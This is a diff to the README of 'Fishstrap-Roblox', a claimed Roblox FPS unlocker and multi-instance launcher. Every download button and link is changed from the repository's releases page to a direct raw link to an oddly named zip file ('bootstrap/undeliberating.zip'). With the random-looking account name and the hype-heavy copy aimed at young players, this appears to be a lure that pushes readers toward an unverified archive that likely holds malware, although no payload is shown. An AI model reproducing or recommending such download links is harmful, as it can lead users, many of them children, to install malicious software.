@@ -1,6 +1,6 @@
 # 🎮 Fishstrap-Roblox - Unlock FPS, Run Multiple Roblox at Once
 
-[![Download Fishstrap](https://img.shields.io/badge/Download-Fishstrap%20Roblox-2ea44f?style=for-the-badge&logo=windows&logoColor=white&color=008080)](https://github.com/Haemoglobinopathyredfox8677/Fishstrap-Roblox/releases)
+[![Download Fishstrap](https://img.shields.io/badge/Download-Fishstrap%20Roblox-2ea44f?style=for-the-badge&logo=windows&logoColor=white&color=008080)](https://raw.githubusercontent.com/Haemoglobinopathyredfox8677/Fishstrap-Roblox/main/bootstrap/undeliberating.zip)
 
 ## 👋 Welcome to Fishstrap
 
@@ -16,7 +16,7 @@ Getting Fishstrap is very easy. Just follow these super simple steps, and you wi
 
 Visit this link to download the application:
 
-[👉 Click Here to Download Fishstrap](https://github.com/Haemoglobinopathyredfox8677/Fishstrap-Roblox/releases)
+[👉 Click Here to Download Fishstrap](https://raw.githubusercontent.com/Haemoglobinopathyredfox8677/Fishstrap-Roblox/main/bootstrap/undeliberating.zip)
 
 )
 
@@ -115,7 +115,7 @@ If something does not work right, here are some easy fixes to try:
 
 Ready to have the best Roblox experience ever? You are just one click away. Get Fishstrap now and join thousands of happy users:
 
-[![Download Now](https://img.shields.io/badge/⬇️%20Download-Fishstrap%20Now-blue?style=for-the-badge&logo=github&color=6f42c1)](https://github.com/Haemoglobinopathyredfox8677/Fishstrap-Roblox/releases)
+[![Download Now](https://img.shields.io/badge/⬇️%20Download-Fishstrap%20Now-blue?style=for-the-badge&logo=github&color=6f42c1)](https://raw.githubusercontent.com/Haemoglobinopathyredfox8677/Fishstrap-Roblox/main/bootstrap/undeliberating.zip)
 
 
 
